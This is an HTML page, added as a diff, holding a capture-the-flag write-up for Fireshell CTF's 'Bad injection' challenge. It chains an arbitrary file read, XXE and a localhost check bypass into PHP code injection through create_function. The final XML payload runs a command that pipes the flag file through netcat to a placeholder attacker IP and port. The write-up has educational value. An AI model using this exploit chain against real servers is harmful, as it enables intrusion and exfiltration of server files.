@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<style>
+
+		body {
+			max-width: 50em;
+			margin: 0 auto;
+			margin-top: 3em;
+		}
+		pre {
+			white-space: pre-wrap;
+			line-height: 125%;
+		}
+		@media only screen and (max-width:768px) {
+			body {
+				max-width:100%;
+			}
+		}
+		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+		td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+		span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+		.codehilite .hll { background-color: #ffffcc }
+		.codehilite { background: #f8f8f8; }
+		.codehilite .c { color: #408080; font-style: italic } /* Comment */
+		.codehilite .err { border: 1px solid #FF0000 } /* Error */
+		.codehilite .k { color: #008000; font-weight: bold } /* Keyword */
+		.codehilite .o { color: #666666 } /* Operator */
+		.codehilite .ch { color: #408080; font-style: italic } /* Comment.Hashbang */
+		.codehilite .cm { color: #408080; font-style: italic } /* Comment.Multiline */
+		.codehilite .cp { color: #BC7A00 } /* Comment.Preproc */
+		.codehilite .cpf { color: #408080; font-style: italic } /* Comment.PreprocFile */
+		.codehilite .c1 { color: #408080; font-style: italic } /* Comment.Single */
+		.codehilite .cs { color: #408080; font-style: italic } /* Comment.Special */
+		.codehilite .gd { color: #A00000 } /* Generic.Deleted */
+		.codehilite .ge { font-style: italic } /* Generic.Emph */
+		.codehilite .gr { color: #FF0000 } /* Generic.Error */
+		.codehilite .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+		.codehilite .gi { color: #00A000 } /* Generic.Inserted */
+		.codehilite .go { color: #888888 } /* Generic.Output */
+		.codehilite .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+		.codehilite .gs { font-weight: bold } /* Generic.Strong */
+		.codehilite .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+		.codehilite .gt { color: #0044DD } /* Generic.Traceback */
+		.codehilite .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+		.codehilite .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+		.codehilite .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+		.codehilite .kp { color: #008000 } /* Keyword.Pseudo */
+		.codehilite .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+		.codehilite .kt { color: #B00040 } /* Keyword.Type */
+		.codehilite .m { color: #666666 } /* Literal.Number */
+		.codehilite .s { color: #BA2121 } /* Literal.String */
+		.codehilite .na { color: #7D9029 } /* Name.Attribute */
+		.codehilite .nb { color: #008000 } /* Name.Builtin */
+		.codehilite .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+		.codehilite .no { color: #880000 } /* Name.Constant */
+		.codehilite .nd { color: #AA22FF } /* Name.Decorator */
+		.codehilite .ni { color: #999999; font-weight: bold } /* Name.Entity */
+		.codehilite .ne { color: #D2413A; font-weight: bold } /* Name.Exception */
+		.codehilite .nf { color: #0000FF } /* Name.Function */
+		.codehilite .nl { color: #A0A000 } /* Name.Label */
+		.codehilite .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+		.codehilite .nt { color: #008000; font-weight: bold } /* Name.Tag */
+		.codehilite .nv { color: #19177C } /* Name.Variable */
+		.codehilite .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+		.codehilite .w { color: #bbbbbb } /* Text.Whitespace */
+		.codehilite .mb { color: #666666 } /* Literal.Number.Bin */
+		.codehilite .mf { color: #666666 } /* Literal.Number.Float */
+		.codehilite .mh { color: #666666 } /* Literal.Number.Hex */
+		.codehilite .mi { color: #666666 } /* Literal.Number.Integer */
+		.codehilite .mo { color: #666666 } /* Literal.Number.Oct */
+		.codehilite .sa { color: #BA2121 } /* Literal.String.Affix */
+		.codehilite .sb { color: #BA2121 } /* Literal.String.Backtick */
+		.codehilite .sc { color: #BA2121 } /* Literal.String.Char */
+		.codehilite .dl { color: #BA2121 } /* Literal.String.Delimiter */
+		.codehilite .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+		.codehilite .s2 { color: #BA2121 } /* Literal.String.Double */
+		.codehilite .se { color: #BB6622; font-weight: bold } /* Literal.String.Escape */
+		.codehilite .sh { color: #BA2121 } /* Literal.String.Heredoc */
+		.codehilite .si { color: #BB6688; font-weight: bold } /* Literal.String.Interpol */
+		.codehilite .sx { color: #008000 } /* Literal.String.Other */
+		.codehilite .sr { color: #BB6688 } /* Literal.String.Regex */
+		.codehilite .s1 { color: #BA2121 } /* Literal.String.Single */
+		.codehilite .ss { color: #19177C } /* Literal.String.Symbol */
+		.codehilite .bp { color: #008000 } /* Name.Builtin.Pseudo */
+		.codehilite .fm { color: #0000FF } /* Name.Function.Magic */
+		.codehilite .vc { color: #19177C } /* Name.Variable.Class */
+		.codehilite .vg { color: #19177C } /* Name.Variable.Global */
+		.codehilite .vi { color: #19177C } /* Name.Variable.Instance */
+		.codehilite .vm { color: #19177C } /* Name.Variable.Magic */
+		.codehilite .il { color: #666666 } /* Literal.Number.Integer.Long */
+
+	
+</style>
+<head>
+  <meta charset="UTF-8">
+</head>
+
+<body><hr />
+<p>layout: post
+category: example2</p>
+<hr />
+<h1>Bad injection <a href="https://ctftime.org/event/727"> [Fireshell CTF] </a></h1>
+<h2><a href="#Enumerating-the-challenge">Enumerating the challenge</a></h2>
+<p><img alt="index" src="https://i.imgur.com/vtZ1BiQ.png" /></p>
+<p>looking at the first 3 pages available <strong>home</strong>, <strong>about</strong> and <strong>contact</strong>, nothing useful is presented to us. But, by accessing the <strong>List</strong> page, we got the icon of an "image
+corrupted" next to the loaded image.</p>
+<p>By analyzing the source of this page, it is possible to see a passage of parameters:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">download</span><span class="err">?</span><span class="n">file</span><span class="o">=</span><span class="n">files</span><span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="nb">hash</span><span class="o">=</span><span class="mi">293</span><span class="n">d05cb2ced82858519bdec71a0354b</span>
+</code></pre></div>
+
+
+<p>this is the "corrupted image". With these parameters, we can read any file on the server. The requirements are:</p>
+<ul>
+<li>the file path is accurate</li>
+<li>the <strong>hash</strong> parameter must contain the md5 of the searched file.</li>
+</ul>
+<p><img alt="listagem-diretorios" src="https://i.imgur.com/kVAupWz.png" /></p>
+<h2>Exploration</h2>
+<p>By scanning the server, we can find the file <strong>Routes.php</strong> inside <strong>/app/</strong> directory, where some http request is required.</p>
+<div class="codehilite"><pre><span></span><code><span class="o">...</span>
+<span class="o">...</span>
+<span class="o">...</span>
+
+<span class="nt">Route</span><span class="p">::</span><span class="nd">set</span><span class="o">(</span><span class="s1">&#39;custom&#39;</span><span class="o">,</span><span class="nt">function</span><span class="o">()</span><span class="p">{</span>
+<span class="w">  </span><span class="err">$handler</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">fopen(&#39;</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">input</span><span class="s1">&#39;,&#39;</span><span class="n">r</span><span class="s1">&#39;);</span>
+<span class="s1">  $data = stream_get_contents($handler);</span>
+<span class="s1">  if(strlen($data) &gt; 1){</span>
+<span class="s1">    Custom::Test($data);</span>
+<span class="s1">  }else{</span>
+<span class="s1">    Custom::createView(&#39;</span><span class="n">Custom</span><span class="err">&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="err">}</span><span class="o">);</span>
+<span class="o">...</span>
+<span class="o">...</span>
+<span class="o">...</span>
+</code></pre></div>
+
+
+<p>and the <strong>Custom.php</strong> file in <strong>/app/Controllers/</strong> .  </p>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nt">&lt;br</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;b&gt;</span>Notice<span class="nt">&lt;/b&gt;</span>:<span class="w">  </span>Undefined<span class="w"> </span>variable:<span class="w"> </span>type<span class="w"> </span>in<span class="w"> </span><span class="nt">&lt;b&gt;</span>/app/Controllers/Download.php<span class="nt">&lt;/b&gt;</span><span class="w"> </span>on<span class="w"> </span>line<span class="w"> </span><span class="nt">&lt;b&gt;</span>21<span class="nt">&lt;/b&gt;&lt;br</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="cp">&lt;?php</span>
+
+    <span class="k">class</span> <span class="nc">Custom</span> <span class="k">extends</span> <span class="nx">Controller</span><span class="p">{</span>
+      <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">Test</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>
+          <span class="nv">$root</span> <span class="o">=</span> <span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span><span class="s1">&#39;SimpleXMLElement&#39;</span><span class="p">,</span><span class="nx">LIBXML_NOENT</span><span class="p">);</span>
+          <span class="nv">$test</span> <span class="o">=</span> <span class="nv">$root</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+          <span class="k">echo</span> <span class="nv">$test</span><span class="p">;</span>
+      <span class="p">}</span>
+
+    <span class="p">}</span>
+
+     <span class="cp">?&gt;</span><span class="w">  </span>
+</code></pre></div>
+
+
+<p>using XXE, we can also return files from the server.  </p>
+<p><img alt="xxe" src="https://i.imgur.com/5aKPJVP.png" /></p>
+<h2>Localhost bypass</h2>
+<p>on the <strong>Routes.php</strong> file above mentioned, you can also see the following code:</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">Route</span><span class="p">::</span><span class="nd">set</span><span class="o">(</span><span class="s1">&#39;admin&#39;</span><span class="o">,</span><span class="nt">function</span><span class="o">()</span><span class="p">{</span>
+<span class="w">  </span><span class="err">if(!isset($_REQUEST</span><span class="cp">[</span><span class="s1">&#39;rss&#39;</span><span class="cp">]</span><span class="err">)</span><span class="w"> </span><span class="err">&amp;&amp;</span><span class="w"> </span><span class="err">!isset($_REQUES</span><span class="cp">[</span><span class="s1">&#39;order&#39;</span><span class="cp">]</span><span class="err">)){</span>
+<span class="w">    </span><span class="n">Admin</span><span class="p">:</span><span class="o">:</span><span class="nf">createView</span><span class="p">(</span><span class="s1">&#39;Admin&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="nt">else</span><span class="p">{</span>
+<span class="w">    </span><span class="err">if($_SERVER</span><span class="cp">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="cp">]</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="err">&#39;127.0.0.1&#39;</span><span class="w"> </span><span class="err">||</span><span class="w"> </span><span class="err">$_SERVER</span><span class="cp">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="cp">]</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="err">&#39;::1&#39;){</span>
+<span class="w">      </span><span class="n">Admin</span><span class="p">:</span><span class="o">:</span><span class="nf">sort</span><span class="p">(</span><span class="err">$</span><span class="n">_REQUEST</span><span class="cp">[</span><span class="s1">&#39;rss&#39;</span><span class="cp">]</span><span class="p">,</span><span class="err">$</span><span class="n">_REQUEST</span><span class="cp">[</span><span class="s1">&#39;order&#39;</span><span class="cp">]</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="nt">else</span><span class="p">{</span>
+<span class="w">     </span><span class="err">echo</span><span class="w"> </span><span class="err">&quot;</span><span class="p">;</span><span class="err">(&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="err">}</span>
+<span class="err">}</span><span class="o">)</span>
+</code></pre></div>
+
+
+<p>This code verifies if that the request comes from the localhost within a conditional structure. If it does, then call Admin::sort.  </p>
+<p>Looking at the <strong>Admin.php</strong> file (also downloaded enum the server), we can see that Admin::sort contains:</p>
+<p><code>usort($data, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));</code></p>
+<p>which gives us an obvious code injection.  </p>
+<hr />
+<p>that way, we need to use the XXE to bypass the verification of localhost and then make a request to /Admin, which returns us the remote code execution.</p>
+<p>the payload:</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [</span>
+<span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
+<span class="cp">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1/admin?rss=http://YOUR_IP/file.xml&amp;order=link.file_get_contents(&#39;http://YOUR_IP/&#39;.exec(&#39;cat&#39;.chr(32).&#39;/da0f72d5d79169971b62a479c34198e7&#39;.chr(124).&#39;/bin/nc&#39;.chr(32).&#39;YOUR_IP&#39;.chr(32).&#39;YOUR_PORT&#39;))&quot;&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;&lt;/root&gt;</span>
+</code></pre></div>
+
+
+<ul>
+<li>the <strong>file.xml</strong> file must be uploaded to your server, with a valid rss with the route and adminsort for request.  </li>
+</ul>
+<p>the output:  </p>
+<p><img alt="flag" src="https://i.imgur.com/FyBD4eq.png" /><br />
+<strong>Flag : f#{1_d0nt_kn0w_wh4t_i4m_d01ng}</strong>  </p>
+<hr />
+<ul>
+<li><a href="https://www.w3schools.com/xml/xml_rss.asp">RSS W3schools</a></li>
+</ul></body><hr>by You</html>
